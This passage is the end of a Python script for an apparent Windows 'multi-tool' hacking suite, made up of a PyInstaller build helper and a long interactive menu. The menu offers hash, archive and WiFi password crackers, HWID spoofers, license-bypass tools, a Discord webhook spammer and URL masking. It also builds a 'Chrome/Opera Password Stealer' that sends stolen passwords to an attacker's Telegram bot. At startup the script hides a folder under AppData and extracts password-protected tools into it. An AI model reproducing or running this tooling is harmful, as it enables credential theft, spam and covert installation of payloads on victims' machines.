        for dep in dependencies:
            try:
                subprocess.check_output(f'pip show {dep}', shell=True, stderr=subprocess.STDOUT, timeout=10)
                print(f'{green}[+] {dep} found{rescolor}')
            except:
                print(f'{yellow}[!] Installing {dep}...{rescolor}')
                try:
                    subprocess.check_output(f'pip install {dep}', shell=True, timeout=60)
                    print(f'{green}[+] {dep} installed successfully{rescolor}')
                except Exception as e:
                    print(f'{yellow}[!] Warning: Could not install {dep}: {e}{rescolor}')
        
        # Build options
        print(f'\n{cyan}[!] Build Configuration:{rescolor}')
        print(f'{yellow}[!] Note: These options will determine how your executable behaves{rescolor}')
        build_options = []
        
        # One file option
        one_file = input(f'{green}[+] Create single executable? (y/N):{white} ').strip().lower()
        if one_file == 'y':
            build_options.append('--onefile')
            print(f'{green}[+] Single file mode enabled{rescolor}')
        else:
            build_options.append('--onedir')
            print(f'{green}[+] Directory mode enabled{rescolor}')
        
        # Console option
        console = input(f'{green}[+] Show console window? (y/N):{white} ').strip().lower()
        if console != 'y':
            build_options.append('--noconsole')
            print(f'{green}[+] Console hidden{rescolor}')
        else:
            print(f'{green}[+] Console visible{rescolor}')
        
        # UAC Admin option
        print(f'\n{cyan}[!] UAC (User Account Control) Options:{rescolor}')
        print(f'{white}   This determines whether your executable will request administrator privileges{rescolor}')
        print(f'{white}   Use this for tools that need system-level access (registry, system files, etc.){rescolor}')
        uac_admin = input(f'{green}[+] Request administrator privileges? (y/N):{white} ').strip().lower()
        if uac_admin == 'y':
            build_options.append('--uac-admin')
            print(f'{green}[+] UAC admin privileges enabled{rescolor}')
            print(f'{yellow}[!] Note: This will make the executable request admin rights when run{rescolor}')
        else:
            print(f'{green}[+] Standard user privileges (no UAC admin){rescolor}')
        
        # Icon option
        if icpath:
            build_options.append(f'--icon={icpath}')
            print(f'{green}[+] Custom icon enabled{rescolor}')
        else:
            print(f'{green}[+] Icon file:{white} Using default icon{rescolor}')
        
        # Additional options
        print(f'\n{cyan}[!] Advanced Options:{rescolor}')
        print(f'{white}[1] Optimize for size (slower startup)')
        print(f'{white}[2] Optimize for speed (larger file)')
        print(f'{white}[3] Default optimization')
        
        opt_choice = input(f'{green}[+] Select optimization (1-3):{white} ').strip()
        if opt_choice == '1':
            build_options.extend(['--optimize=2', '--strip'])
            print(f'{green}[+] Size optimization enabled{rescolor}')
        elif opt_choice == '2':
            build_options.append('--optimize=0')
            print(f'{green}[+] Speed optimization enabled{rescolor}')
        else:
            print(f'{green}[+] Default optimization selected{rescolor}')
        
        # Build the executable
        print(f'\n{cyan}[!] Building executable...{rescolor}')
        print(f'{cyan}[!] This may take several minutes depending on your file size...{rescolor}')
        
        start_time = time.time()
        
        # Construct PyInstaller command
        cmd = f'pyinstaller {" ".join(build_options)} "{fpath}"'
        print(f'{cyan}[!] Command: {cmd}{rescolor}')
        
        # Show build options summary
        print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        print(f'{green}[+] Build Configuration Summary:{rescolor}')
        print(f'{white}   File Mode: {"Single file" if "--onefile" in build_options else "Directory"}{rescolor}')
        print(f'{white}   Console: {"Hidden" if "--noconsole" in build_options else "Visible"}{rescolor}')
        print(f'{white}   UAC Admin: {"Enabled" if "--uac-admin" in build_options else "Disabled"}{rescolor}')
        print(f'{white}   Custom Icon: {"Yes" if icpath else "No"}{rescolor}')
        print(f'{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        
        try:
            # Run PyInstaller with progress indication
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
                                     stderr=subprocess.STDOUT, text=True, bufsize=1)
            
            # Show progress
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    # Filter and display relevant output
                    if any(keyword in output.lower() for keyword in ['building', 'analyzing', 'compiling', 'linking']):
                        print(f'{cyan}[!] {output.strip()}{rescolor}')
                    elif 'error' in output.lower():
                        print(f'{red}[-] {output.strip()}{rescolor}')
                    elif 'warning' in output.lower():
                        print(f'{yellow}[!] {output.strip()}{rescolor}')
            
            # Wait for completion
            return_code = process.poll()
            
            if return_code == 0:
                elapsed_time = time.time() - start_time
                print(f'\n{green}[+] Build completed successfully in {elapsed_time:.1f} seconds!{rescolor}')
                
                # Show results
                try:
                    os.chdir('dist')
                    exe_files = [f for f in os.listdir('.') if f.endswith('.exe')]
                    
                    if exe_files:
                        print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
                        print(f'{green}[+] Executable(s) created successfully:{rescolor}')
                        
                        for exe_file in exe_files:
                            exe_path = os.path.abspath(exe_file)
                            file_size = os.path.getsize(exe_file) / (1024 * 1024)  # MB
                            print(f'{white}   File: {exe_file}')
                            print(f'{white}   Path: {exe_path}')
                            print(f'{white}   Size: {file_size:.2f} MB')
                            print(f'{white}   Created: {time.strftime("%Y-%m-%d %H:%M:%S")}')
                            print()
                        
                        # Open dist folder
                        try:
                            subprocess.check_output('explorer .', shell=True)
                            print(f'{green}[+] Dist folder opened in Explorer{rescolor}')
                        except:
                            pass
                        
                        # Clean up build files
                        print(f'\n{cyan}[!] Cleaning up build files...{rescolor}')
                        os.chdir(tool_parent_dir)
                        
                        try:
                            if os.path.exists('build'):
                                shutil.rmtree('build')
                            if os.path.exists(f'{os.path.splitext(fpath)[0]}.spec'):
                                os.remove(f'{os.path.splitext(fpath)[0]}.spec')
                            print(f'{green}[+] Build files cleaned up{rescolor}')
                        except Exception as e:
                            print(f'{yellow}[!] Warning: Could not clean up all build files: {e}{rescolor}')
                        
                        return True
                    else:
                        print(f'{red}[-] No executable files found in dist folder{rescolor}')
                        return False
                        
                except Exception as e:
                    print(f'{red}[-] Error accessing dist folder: {e}{rescolor}')
                    return False
                    
            else:
                print(f'\n{red}[-] Build failed with return code: {return_code}{rescolor}')
                return False
                
        except Exception as e:
            print(f'\n{red}[-] Build error: {e}{rescolor}')
            return False
            
    except KeyboardInterrupt:
        print(f'\n{cyan}[!] Build interrupted by user{rescolor}')
        return False
    except Exception as e:
        print(f'\n{red}[-] Unexpected error: {e}{rescolor}')
        return False
    finally:
        # Return to original directory
        try:
            os.chdir(tool_parent_dir)
        except:
            pass

def enhanced_main():
    global username, hwid, hash_type
    os.chdir(path_to_assistfolder)
    try:
        while True:
            os.system('cls')
            
            # Get current system time and date
            current_time = datetime.now().strftime('%I:%M %p')
            current_date = datetime.now().strftime('%A, %B %d, %Y')
            
            # Get system status
            try:
                cpu_percent = psutil.cpu_percent(interval=1)
                memory = psutil.virtual_memory()
                memory_percent = memory.percent
                disk = psutil.disk_usage('/')
                disk_percent = disk.percent
            except:
                cpu_percent = 0
                memory_percent = 0
                disk_percent = 0
            
            # Modern Banner with System Status
            print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
            print(f'{cyan}║                                    {lcyan}🚀 APKALESS MULTI-TOOL SUITE 🚀{cyan}                                   ║')
            print(f'{cyan}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
            print(f'{cyan}║  {lcyan}👤 User:{white} {username:<12} {lcyan}🕐 Time:{white} {current_time:<12} {lcyan}📅 Date:{white} {current_date:<25}{cyan}                      ║')
            print(f'{cyan}║  {lcyan}💻 CPU:{white} {cpu_percent:>3.0f}%{cyan} {' ' * 8} {lcyan}🧠 RAM:{white} {memory_percent:>3.0f}%{cyan} {' ' * 8} {lcyan}💾 Disk:{white} {disk_percent:>3.0f}%{cyan} {' ' * 8}                                  ║')
            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
            
            # Main Menu Categories
            print(f'\n{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
            print(f'{cyan}║                                    {lcyan}🔧 SYSTEM TOOLS & UTILITIES{cyan}                                       ║')
            print(f'{cyan}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
            print(f'{cyan}║  {lcyan}[01]{white} IDM Trial Reset                 {lcyan}[02]{white} Clean Temp Files                  {lcyan}[03]{white} Activate Windows{cyan}   ║')
            print(f'{cyan}║  {lcyan}[04]{white} Network Optimizer               {lcyan}[05]{white} Get Proxies                       {lcyan}[06]{white} Proxy Checker{cyan}      ║')
            print(f'{cyan}║  {lcyan}[07]{white} Get HWID                        {lcyan}[08]{white} Spoof HWID                        {lcyan}[09]{white} Spoof Disk HWID{cyan}    ║')
            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
            
            print(f'\n{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
            print(f'{cyan}║                                    {lcyan}🔐 PASSWORD CRACKING & SECURITY{cyan:}                                   ║')
            print(f'{cyan}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
            print(f'{cyan}║  {lcyan}[10]{white} Hash Cracker                    {lcyan}[11]{white} 7z Files Cracker                  {lcyan}[12]{white} ZIP Files Cracker{cyan}  ║')
            print(f'{cyan}║  {lcyan}[13]{white} Show Saved WiFi Passwords       {lcyan}[14]{white} Fastest Wordlist Generator        {lcyan}[15]{white} WiFi Cracker{cyan}       ║')
            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
            
            print(f'\n{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
            print(f'{cyan}║                                    {lcyan}🌐 NETWORK & WEB TOOLS{cyan}                                            ║')
            print(f'{cyan}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
            print(f'{cyan}║  {lcyan}[16]{white} Discord Users Checker            {lcyan}[17]{white} Discord Webhook Spammer          {lcyan}[18]{white} URL Masking{cyan}        ║')
            print(f'{cyan}║  {lcyan}[19]{white} IP & Domain Lookup               {lcyan}[20]{white} Public IP Lookup                 {lcyan}[21]{white} Phone Tracker{cyan}      ║')
            print(f'{cyan}║  {lcyan}[22]{white} Advanced Nmap Commands           {lcyan}[23]{white} System Information               {lcyan}[24]{white} Python to EXE{cyan}      ║')
            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
            
            print(f'\n{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
            print(f'{cyan}║                                    {lcyan}⚙️  ADVANCED & SPECIAL TOOLS{cyan}                                      ║')
            print(f'{cyan}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣')
            print(f'{cyan}║  {lcyan}[25]{white} Malware (Chrome/Opera Password Stealer)                                                {cyan}        ║')
            print(f'{cyan}║  {lcyan}[26]{white} Settings & Configuration                                                              {cyan}         ║')
            print(f'{cyan}║  {lcyan}[27]{white} System Monitor                                                                        {cyan}         ║')
            print(f'{cyan}║  {lcyan}[28]{white} About & Help                                                                          {cyan}         ║')
            print(f'{cyan}║  {lcyan}[00]{white} Exit Application                                                                      {cyan}         ║')
            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
            
            # Footer with version and social links
            print(f'\n{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
            print(f'{cyan}║  {lcyan}🔗 GitHub:{white} https://github.com/apkaless  {lcyan}📱 Instagram:{white} @apkaless  {lcyan}🌍 Region:{white} IRAQ  {lcyan}📦 Version:{white} {cversion}{cyan}     ║')
            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
            
            # Enhanced input prompt
            print(f'\n{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
            print(f'{cyan}║  {lcyan}💡 Tip:{white} Use the number keys to navigate. Type {lcyan}00{white} to exit.{cyan}                                           ║')
            print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
            
            cmd = input(f'\n{green}[{current_time}]{lcyan} ➤ {white}Enter your choice: ').strip()
            
            # Exit command
            if cmd == '00':
                os.system('cls')
                print(f'\n{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
                print(f'{cyan}║                                    {lcyan}👋 GOODBYE!{cyan}                                                       ║')
                print(f'{cyan}║  {white}Thank you for using Apkaless Multi-Tool Suite!{cyan}                                                      ║')
                print(f'{cyan}║  {white}See you later, {lcyan}Mr. {username}{white}!{cyan}                                                                           ║')
                print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
                time.sleep(3)
                break
            
            # System Tools & Utilities
            if cmd == '1':
                try:
                    subprocess.check_output('cmd.exe /C start "IDM" tools/IDM_Trial_Reset.exe', shell=True)
                    print(f'\n{green}[+] IDM Trial Reset launched successfully!{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] Failed to launch IDM Trial Reset: {e}{rescolor}')
                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                
            elif cmd == '2':
                try:
                    subprocess.check_output('cmd.exe /C start "Cleaner" tools/cleaner.exe', shell=True)
                    print(f'\n{green}[+] Temp File Cleaner launched successfully!{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] Failed to launch Temp File Cleaner: {e}{rescolor}')
                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                
            elif cmd == '3':
                try:
                    subprocess.check_output('cmd.exe /C start "Activation" tools/WindowsActivation.exe', shell=True)
                    print(f'\n{green}[+] Windows Activation tool launched successfully!{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] Failed to launch Windows Activation tool: {e}{rescolor}')
                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                
            elif cmd == '4':
                try:
                    os.system('cls')
                    subprocess.check_output('cmd.exe /c start "NetOptimizer" tools/Network_Optimizer.exe', shell=True)
                    print(f'\n{green}[+] Network Optimizer launched successfully!{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] Failed to launch Network Optimizer: {e}{rescolor}')
                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                
            elif cmd == '5':
                try:
                    proxy_gen()
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] Proxy generation failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '6':
                try:
                    os.system('cls')
                    prxlistinput = os.path.join(input(f'\n{green}[+] Path To Proxies List To Check:{white} '))
                    proxy_check(prxlistinput)
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] Proxy checking failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '7':
                try:
                    hwid = get_hwid()
                    print(f'\n{green}[+] Current HWID:{white} {hwid}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] Failed to get HWID: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '8':
                try:
                    mssg = hwid_spoofer()
                    machine_id = machineID_spoofer()
                    if mssg and machine_id:
                        print(f'\n{green}[+] MAC Address Spoofed Successfully!{rescolor}')
                        print(f'{green}[+] HWIDs Spoofed Successfully!{rescolor}')
                        print(f'{green}[+] New HWID is: {get_hwid()}{rescolor}')
                        print(f'{yellow}[!] Old HWID was: {hwid}{rescolor}')
                    else:
                        print(f'{red}[-] There was an error while spoofing HWIDs.{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] HWID spoofing failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '9':
                try:
                    os.chdir(path_to_assistfolder)
                    os.chdir('tools')
                    os.chdir('diskids')
                    mainfile = os.listdir()[0]
                    subprocess.check_output(f'start {mainfile}', shell=True)
                    print(f'\n{green}[+] Disk HWID Spoofer launched successfully!{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] Failed to launch Disk HWID Spoofer: {e}{rescolor}')
                input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                
            # Password Cracking & Security
            elif cmd == '10':
                try:
                    os.system('cls')
                    print(f'''{yellow}[!] {white}Supported Hash Types:

{blue}[1]{white} sha256    {blue}[2]{white} sha1    {blue}[3]{white} sha224    {blue}[4]{white} sha384    {blue}[5]{white} sha512    {blue}[6]{white} md5{rescolor}
''')
                    try:
                        hash_type = int(input(f'{green}[+] Hash Type (1-6):{white} '))
                        if hash_type < 1 or hash_type > 6:
                            raise ValueError("Invalid hash type")
                    except:
                        print(f'\n{red}[-] Invalid hash type! Please choose 1-6.{rescolor}')
                        time.sleep(3)
                        continue
                        
                    os.system('cls')
                    hash = input(f'\n{green}[+] Hash To Crack:{white} ')
                    pwdlistinput = os.path.join(input(f'\n{green}[+] Path To Passwords List:{white} '))
                    enhanced_hash_cracker(hash, pwdlistinput, hash_type)
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except KeyboardInterrupt:
                    continue
                except Exception as e:
                    print(f'\n{red}[-] Hash cracking failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '11':
                try:
                    os.system('cls')
                    zipfinput = os.path.join(input(f'\n{green}[+] Path To 7z File To Crack:{white} '))
                    pwdlistinput = os.path.join(input(f'\n{green}[+] Path To Passwords List:{white} '))
                    enhanced_sevenz_cracker(zipfinput, pwdlistinput)
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except KeyboardInterrupt:
                    continue
                except Exception as e:
                    print(f'\n{red}[-] 7z cracking failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '12':
                try:
                    os.system('cls')
                    zipfinput = os.path.join(input(f'\n{green}[+] Path To ZIP File To Crack:{white} '))
                    pwdlistinput = os.path.join(input(f'\n{green}[+] Path To Passwords List:{white} '))
                    if zipfinput and pwdlistinput:
                        enhanced_zipfilecracker(zipfinput, pwdlistinput)
                    else:
                        print(f'{red}[-] Invalid file paths provided.{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except KeyboardInterrupt:
                    continue
                except Exception as e:
                    print(f'\n{red}[-] ZIP cracking failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '13':
                try:
                    enhanced_wifiPassword()
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] WiFi password retrieval failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '14':
                try:
                    enhanced_wordlist()
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except KeyboardInterrupt:
                    continue
                except Exception as e:
                    print(f'\n{red}[-] Wordlist generation failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '15':
                try:
                    os.system('cls')
                    pwds = os.path.join(input(f'\n{green}[+] Path To Passwords Dictionary:{white} '))
                    if pwds:
                        crack_wifi(pwds)
                    else:
                        print(f'{red}[-] Invalid password dictionary path.{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except KeyboardInterrupt:
                    continue
                except Exception as e:
                    print(f'\n{red}[-] WiFi cracking failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            # Network & Web Tools
            elif cmd == '16':
                try:
                    os.system('cls')
                    while True:
                        try:
                            print(f'''{yellow}[!] {white}Discord Users Checker Instructions:{rescolor}

{blue}[1]{white} Go to https://www.emailnator.com/
{blue}[2]{white} Make sure the email ends with @gmail.com, click Go
{blue}[3]{white} Go to https://discord.com/register and create the account
{blue}[4]{white} Go to https://discord.com/login and login into Discord
{blue}[5]{white} Login with account in this tool
{blue}[6]{white} Keep your browser open and logged into Discord website{rescolor}
''')
                            webbrowser.open('https://discord.com/login')
                            print(f'{cyan}[!] Login into Discord using browser first, then login here{rescolor}')

                            emailInput = str(input(f'\n{green}[+] Email:{white} '))
                            passwordInput = str(input(f'{green}[+] Password:{white} '))

                            if not emailInput:
                                print(f'\n{red}[-] Email cannot be empty{rescolor}')
                                time.sleep(3)
                                os.system('cls')
                                continue
                            elif not passwordInput:
                                print(f'\n{red}[-] Password cannot be empty{rescolor}')
                                time.sleep(3)
                                os.system('cls')
                                continue
                            else:
                                break
                        except KeyboardInterrupt:
                            break
                            
                    if emailInput and passwordInput:
                        th = threading.Thread(target=discordHunter, args=(emailInput, passwordInput))
                        th.start()
                        th.join()
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] Discord users checker failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '17':
                try:
                    enhanced_webhookSpammer()
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] Webhook spamming failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '18':
                try:
                    enhanced_url_masking()
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] URL masking failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '19':
                try:
                    os.system('cls')
                    ip = input(f'\n{green}[+] IP Address OR Domain Name:{white} ')
                    if ip:
                        enhanced_ip_lookup(ip)
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except KeyboardInterrupt:
                    continue
                except Exception as e:
                    print(f'\n{red}[-] IP lookup failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '20':
                try:
                    os.system('cls')
                    enhanced_public_ip()
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] Public IP lookup failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '21':
                try:
                    os.system('cls')
                    phone = input(f'\n{green}[+] Phone Number (with country code):{white} ')
                    if phone:
                        enhanced_phoneNumberTracker(phone)
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except KeyboardInterrupt:
                    continue
                except Exception as e:
                    print(f'\n{red}[-] Phone tracking failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '22':
                try:
                    nmapCommands()
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] Nmap commands failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '23':
                try:
                    os.system('cls')
                    enhanced_sysinfo()
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except Exception as e:
                    print(f'\n{red}[-] System info failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '24':
                try:
                    os.system('cls')
                    appname = input(f'\n{green}[+] Python File Path:{white} ')
                    appico = input(f'{green}[+] Icon Path (press Enter to skip):{white} ')
                    if appico.strip() == '':
                        appico = None
                    enhanced_py2exe(appname, appico)
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except KeyboardInterrupt:
                    continue
                except Exception as e:
                    print(f'\n{red}[-] Python to EXE conversion failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            # Advanced & Special Tools
            elif cmd == '25':
                try:
                    os.system('cls')
                    print(f'{yellow}[!] {white}Malware Tool - Chrome & Opera Password Stealer{rescolor}')
                    print(f'{red}[!] {white}WARNING: This tool is for educational purposes only!{rescolor}\n')
                    
                    btoken = input(f'{green}[+] Telegram Bot Token:{white} ')
                    cid = input(f'{green}[+] Telegram Channel ID:{white} ')
                    malname = input(f'{green}[+] Malware Name (no spaces):{white} ')
                    malico = input(f'{green}[+] Icon Path:{white} ')

                    malware(btoken, cid, malname, malico)
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                except KeyboardInterrupt:
                    continue
                except Exception as e:
                    print(f'\n{red}[-] Malware tool failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '26':
                try:
                    show_settings_menu()
                except Exception as e:
                    print(f'\n{red}[-] Settings menu failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '27':
                try:
                    system_monitor()
                except Exception as e:
                    print(f'\n{red}[-] System monitor failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            elif cmd == '28':
                try:
                    show_about_help()
                except Exception as e:
                    print(f'\n{red}[-] About & Help failed: {e}{rescolor}')
                    input(f'\n{blue}[!] {green}Press Enter to continue...{rescolor}')
                    
            else:
                print(f'\n{red}[-] Invalid choice! Please select a valid option.{rescolor}')
                time.sleep(2)

    except KeyboardInterrupt:
        os.system('cls')
        print(f'\n{cyan}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗')
        print(f'{cyan}║                                    {lcyan}👋 GOODBYE!{cyan}                                                       ║')
        print(f'{cyan}║  {white}Application interrupted by user. See you later, {lcyan}Mr. {username}{white}!{cyan}                                          ║')
        print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{rescolor}')
        time.sleep(3)


if __name__ == '__main__':
    try:
        os.system('cls')
        
        # Initialize color variables
        red = Fore.RED
        white = Fore.WHITE
        blue = Fore.BLUE
        green = Fore.GREEN
        yellow = Fore.YELLOW
        lightyellow = Fore.LIGHTYELLOW_EX
        cyan = Fore.CYAN
        lcyan = Fore.LIGHTCYAN_EX
        lmagenta = Fore.LIGHTMAGENTA_EX
        rescolor = Fore.RESET
        
        # Application version and configuration
        cversion = 3
        tool_parent_dir = os.getcwd()
        username = os.getlogin()
        
        # Setup paths
        testfold = f'C:/Users/{username}/AppData/Roaming/'
        path_to_roaming_windows = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows'
        path_to_assistfolder = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/assistfolder'
        zipfile_password = 'apkaless@iraq@2003@sabah@@2003'

        os.chdir(path_to_roaming_windows)
        if os.path.exists('assistfolder'):
            os.chdir('assistfolder')
            if len(os.listdir()) <= 0:
                os.chdir(tool_parent_dir)
                print(f'{green}[+] Extracting tools...{white}')
                with pyzipper.AESZipFile('tools.zip', mode='r') as f:
                    f.extractall(pwd=zipfile_password.encode())
                print(f'{green}[+] Tools extracted successfully{white}')
        else:
            os.mkdir('assistfolder')
            os.system('attrib /S /D +H assistfolder')
            
        os.chdir(tool_parent_dir)
        
        if not os.path.exists(path_to_assistfolder) or len(os.listdir(path_to_assistfolder)) <= 0:
            print(f'{green}[+] Extracting tools to assist folder...{white}')
            with pyzipper.AESZipFile('tools.zip', mode='r') as f:
                f.extractall(path=path_to_assistfolder, pwd=zipfile_password.encode())

        print(f'{cyan}[!] Checking for updates...{white}')
        enhanced_check_update()
        enhanced_main()
        
    except KeyboardInterrupt:
        print(f'\n{cyan}[!] Application startup interrupted by user')
        sys.exit(0)
    except Exception as e:
        print(f'\n{red}[-] Critical error during startup: {e}')
        logger.error(f"Critical startup error: {e}")
        print(f'{yellow}[!] Please check the logs for more details')
        input(f'\n{blue}[!] {green}Press Enter to exit{rescolor}')
        sys.exit(1)
